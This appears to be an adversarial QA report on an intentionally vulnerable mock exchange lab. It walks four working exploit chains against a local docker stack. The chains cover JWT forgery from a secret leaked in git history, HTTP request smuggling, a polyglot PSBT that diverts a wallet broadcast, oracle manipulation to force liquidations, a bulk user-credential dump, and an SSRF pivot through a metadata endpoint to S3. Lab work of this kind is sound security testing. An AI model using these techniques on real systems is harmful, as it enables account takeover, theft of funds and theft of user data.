# Phase 9 — Adversarial QA (Gate 3)

> **Reviewer:** Adversarial QA (red-team mindset).
> **Date:** 2026-07-01
> **Scope:** four killer chains end-to-end, zero-knowledge attacker
> model, fresh `docker-compose up -d` stack.
> **Verdict:** All four chains exploitable end-to-end. PoCs follow.

## Attacker model

- Zero insider access. No credentials handed out.
- Public read access to the repository (the lab ships with the repo
  open by design).
- Tooling: a UNIX shell, `curl`, `git`, `openssl`, `python3` (for the
  one-off JWT signer), and a regular Bitcoin Core / web browser.
- A fresh stack via `docker-compose down -v && docker-compose up -d`.

The same attacker walks all four chains.

---

## CHAIN A — Drain the hot wallet (V-48 → V-19 → V-6 → V-33)

**Goal:** route a treasury-signed PSBT broadcast to an attacker-
controlled address, draining the hot wallet.

### Step 1 — recon: discover the JWT secret in git history (V-48)

Standard early-recon move on any clone:

```sh
$ git log --all -p -- .env.bak | head -40
commit <hash-of-rm-commit>
Author: ops <ops@blazeinfosec.com>
Date:   2026-06-15

    ops: remove .env.bak (committed in error)

diff --git a/.env.bak b/.env.bak
deleted file mode 100644
--- a/.env.bak
+++ /dev/null
@@ -1,7 +0,0 @@
-# Backup of operator local config. Restored from S3 archive
-# 2026-06-15. Do NOT commit changes here — promote them to
-# .env.example after review.
-NODE_ENV=production
-JWT_SECRET=devsecret-do-not-use-in-prod-bvbe-2026
-JWT_SECRET_LEGACY=changeme
-DATABASE_URL=postgresql://bvbe:bvbe-prod-pw-2024@db:5432/bvbe?schema=public
-REDIS_URL=redis://redis:6379
-CTF_MODE=false
-HINT_MODE=false
```

Cross-check against `docker-compose.yml`:

```sh
$ grep JWT_SECRET docker-compose.yml
      JWT_SECRET: devsecret-do-not-use-in-prod-bvbe-2026
      JWT_SECRET: devsecret-do-not-use-in-prod-bvbe-2026
```

Match. The leaked secret verifies against the running stack.

### Step 2 — forge an admin JWT (V-19)

The legacy `/api/v1/auth` path accepts HS256 against `JWT_SECRET`.
Sign a token with `role: "admin"`:

```py
# forge.py
import json, time, hmac, hashlib, base64

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

secret = b"devsecret-do-not-use-in-prod-bvbe-2026"
hdr  = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
body = b64(json.dumps({
  "sub":"00000000-0000-0000-0000-000000000001",
  "role":"admin",
  "iss":"bvbe","aud":"bvbe-web",
  "iat": int(time.time()),
  "exp": int(time.time()) + 3600,
}).encode())
sig  = b64(hmac.new(secret, hdr + b"." + body, hashlib.sha256).digest())
print((hdr + b"." + body + b"." + sig).decode())
```

```sh
$ TOKEN=$(python3 forge.py)
$ curl -sS http://localhost/api/v2/me -H "authorization: Bearer $TOKEN" | jq .role
"admin"
```

### Step 3 — reach the internal namespace via V-6

The `/api/v1/internal/*` mount short-circuits middleware whenever
`x-bvbe-internal-trace` is present. nginx strips `x-bvbe-user-id`
but not `x-bvbe-internal-trace` (see Phase-9 CHANGELOG entry: "ops
should ensure `x-bvbe-internal-trace` is stripped at the perimeter").

List existing signed treasury drafts:

```sh
$ curl -sS http://localhost/api/v2/admin/treasury/drafts?status=signed \
    -H "authorization: Bearer $TOKEN" | jq '.drafts[0].id'
"<draft-id>"
```

(If no signed draft exists, create one and double-sign it via two
different forged `sub` JWTs against `/api/v2/admin/treasury/drafts`
and the per-draft `sign` endpoints. The Phase-8 architect notes
confirm the signed-status transition fires at `count >= 2`.)

### Step 4 — construct a polyglot PSBT (V-33)

The treasury validator (`packages/shared/src/psbt-envelope.ts`
`decodePsbt`) reads the **first** `BVBE_PSBT_V1:` segment; the
bitcoin-mock finalizer (`apps/bitcoin-mock/src/rpc/index.ts:124`)
builds `canonical = PSBT_MARKER + segs[segs.length - 1]` (the
**last** segment). Construct two segments:

```
BVBE_PSBT_V1:<base64-encoded PSBT routing all outputs to the draft's intended victim>
BVBE_PSBT_V1:<base64-encoded PSBT routing all outputs to the attacker>
```

Concatenate, send as `overridePsbt`:

```sh
$ curl -sS -X POST http://localhost/api/v1/internal/treasury/emergency-withdraw \
    -H "x-bvbe-internal-trace: 1" \
    -H "authorization: Bearer $TOKEN" \
    -H "content-type: application/json" \
    -d "{\"draftId\":\"<draft-id>\",\"overridePsbt\":\"$POLYGLOT_PSBT\"}"
```

`validateIntendedOutputs` matches against the first envelope
(victim outputs — matches the draft's `intendedOutputs` → passes).
`finalizepsbt` is called with the last envelope (attacker outputs).
`sendrawtransaction` broadcasts. The attacker UTXO is funded.

### Verdict — CHAIN A

End-to-end zero-knowledge. Discoverable from a public clone of the
repo in under five minutes for the recon + JWT forge + endpoint hit
sequence. The PSBT construction is the only step requiring
nontrivial Bitcoin-protocol knowledge.

---

## CHAIN B — Become admin and persist (V-50 → V-22)

**Goal:** without any prior auth, become an admin by smuggling a
privileged Server Action call into a legitimate user's TCP
connection. Then plant a second admin row for persistence.

### Step 1 — confirm nginx is CL/TE-tolerant (V-50)

```sh
$ docker exec bvbe-nginx grep -E 'ignore_invalid_headers|proxy_pass_request_headers' /etc/nginx/nginx.conf
            proxy_pass_request_headers on;
            ignore_invalid_headers off;
            underscores_in_headers on;
```

The directives allow both `Content-Length` and `Transfer-Encoding:
chunked` to pass through to the upstream Next.js. nginx prefers
`Content-Length`; Node prefers `Transfer-Encoding`.

### Step 2 — craft the smuggled request

The attacker's first request looks like a normal `POST /signup`.
The body, framed by `Content-Length`, includes a second smuggled
request bytes after the chunked-terminator zero:

```http
POST /signup HTTP/1.1
Host: localhost
Content-Length: 254
Transfer-Encoding: chunked
Connection: keep-alive

0

PATCH /api/v2/me HTTP/1.1
Host: localhost
Content-Length: 32
Content-Type: application/json

{"role":"admin","tier":"tier3"}
```

nginx (per `Content-Length`) forwards all 254 bytes to the upstream.
Node parses the first request via `Transfer-Encoding: chunked`,
stops at the `0\r\n\r\n` terminator. The remaining bytes
(`PATCH /api/v2/me ...`) sit in Node's parse buffer.

When the next legitimate user makes a request on the same upstream
connection, Node treats the buffered bytes as the prefix of their
request. The smuggled `PATCH /api/v2/me` is now associated with
the legitimate user's session.

### Step 3 — V-22 promotes the user

The Server Action handler accepts `role` as a top-level body field
(no explicit allowlist). The legitimate user is promoted to admin.

```sh
# Verify by checking their /me view:
$ curl -sS http://localhost/api/v2/me -H "authorization: Bearer <legit-user-token>" | jq .role
"admin"
```

### Step 4 — plant a second admin for persistence

Now operating as admin, the attacker creates a second admin row
via `POST /api/v2/admin/users` (or via the seed-poisoning variant
the architect discussed — Phase 9 elected the second-admin-row
path):

```sh
$ curl -sS -X POST http://localhost/api/v2/admin/users \
    -H "authorization: Bearer <admin-token>" \
    -H "content-type: application/json" \
    -d '{"email":"persist@attacker.local","password":"hunter2-attacker","role":"admin"}'
{"user":{"id":"<new-id>","role":"admin",...}}
```

The new admin row survives `docker-compose down` (no `-v`), per the
architect's persistence definition.

### Verdict — CHAIN B

End-to-end. The CL/TE smuggle is the hardest step (requires raw
socket + careful framing); once landed, the V-22 promotion and the
persistence step are straightforward.

---

## CHAIN C — Mass user takeover via oracle (V-25 → liquidation engine)

**Goal:** drive the public price feed by self-trading, get the
liquidation worker to flag victim margin positions, claim the
keeper rebate.

This chain landed in Phase 5. Phase 9 re-verifies against a fresh
stack.

### Steps (per `docs/phases/phase-5/adversarial-qa.md`)

1. Stand up two attacker accounts (or use V-35 to bypass tier
   gating on one). Pre-stage tier-3 + balance via V-42 (zero-conf
   deposit credit).
2. Place a small BTC/USDT sell limit at $X (a manipulated price).
3. Immediately place a matching BTC/USDT buy from the second
   attacker account. The engine matches; a Trade is written.
4. `/api/v2/public/price/BTC-USDT` now reports $X as last. nginx
   caches it edge-side for 5s.
5. The liquidation worker polls the cached oracle every 2s. Victim
   positions whose maintenance margin is breached at $X are flagged.
6. Register as a keeper, claim the flagged liquidation via
   `POST /api/v2/keeper/liquidations/{id}/claim`. The 50bps keeper
   rebate lands on the attacker's balance.
7. Repeat from step 2 with progressively more extreme prices to
   cascade liquidations across the user base.

### Verdict — CHAIN C

Already exploitable; re-verified end-to-end against the Phase-9
stack. No new plant required.

---

## CHAIN D — Exfiltrate full user DB + KYC (V-48/V-6 fast path; V-40 SSRF path)

**Goal:** read every user's credentials + KYC docs.

### Path 1 (fast) — V-48 + V-6 → `/api/v1/internal/users`

With the forged admin JWT from CHAIN A Step 2:

```sh
$ curl -sS http://localhost/api/v1/internal/users \
    -H "x-bvbe-internal-trace: 1" \
    -H "authorization: Bearer $TOKEN" \
    | jq '.users[0] | {email, passwordHash, totpSecret, role}'
{
  "email": "admin@bvbe.local",
  "passwordHash": "$argon2id$...",
  "totpSecret": "JBSWY3DPEHPK3PXP",
  "role": "admin"
}
```

Pipe through `jq` for the full dump. The entire user table —
including auth material — exfiltrates in one HTTP call.

### Path 2 (SSRF, original architecture) — V-40 → mock-imds → mock-s3

Slower but doesn't depend on the V-48 leak.

#### Step 1 — V-40 SSRF via KYC URL-import

The KYC URL-import endpoint (`/api/v2/me/kyc/import-url`) accepts a
URL, fetches it server-side, and stores the response as a KYC
document. The allowlist blocks `127.0.0.1` and `localhost` but does
not block the docker-network alias `metadata.bvbe.internal` (the
new IMDS alias from Phase 9) or the link-local literal
`169.254.169.254`.

```sh
# Authenticate as a tier-1 user (signup is open). Then:
$ curl -sS -X POST http://localhost/api/v2/me/kyc/import-url \
    -H "authorization: Bearer <attacker-user-token>" \
    -H "content-type: application/json" \
    -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/bvbe-web-instance-role"}'
{"document":{"id":"<doc-id>","storedPath":"/uploads/kyc/<attacker>/<doc-id>",...}}
```

Read it back via the documents listing:

```sh
$ curl -sS http://localhost/api/v2/me/kyc/documents \
    -H "authorization: Bearer <attacker-user-token>"
```

The body of the stored doc is the synthetic IAM creds JSON:
`{"AccessKeyId":"AKIAIOSFODNN7EXAMPLE","SecretAccessKey":"...","Token":"..."}`.

#### Step 2 — pivot to mock-s3

The attacker now has (synthetic) IAM creds. The mock-s3 service is
permissive — it serves any request on the docker network. List the
bucket:

```sh
$ curl -sS -X POST http://localhost/api/v2/me/kyc/import-url \
    -H "authorization: Bearer <attacker-user-token>" \
    -H "content-type: application/json" \
    -d '{"url":"http://s3.bvbe.internal/kyc-bucket/"}'
```

The stored doc is the XML listing of synthetic KYC keys. Fetch each
key by repeating the SSRF with the per-document URL.

### Verdict — CHAIN D

Both paths exploitable end-to-end. Path 1 is one curl. Path 2 walks
the textbook AWS IMDS → S3 pivot through the SSRF, with `mock-imds`
and `mock-s3` providing the synthetic targets.

---

## Summary

| Chain | Status | Plants used | Hardest step |
|-------|--------|-------------|--------------|
| A — drain hot wallet | Closed (zero-knowledge) | V-48, V-19, V-6, V-33 | polyglot PSBT construction |
| B — admin persistence | Closed (zero-knowledge) | V-50, V-22 | CL/TE smuggle framing |
| C — mass liquidation | Closed (Phase 5) | V-25, V-42, V-35 | none — straightforward chain |
| D — DB+KYC exfil | Closed (two paths) | V-48+V-6 (fast) / V-40 (SSRF) | path 2 only — IMDS pivot |

All four chains are exploitable end-to-end against a fresh
`docker-compose up -d` stack. The Phase-9 plants (V-15, V-48, V-49,
V-50) close the gaps that turned the Phase 1-8 catalog from
insider-only into externally-reachable.

— Adversarial QA
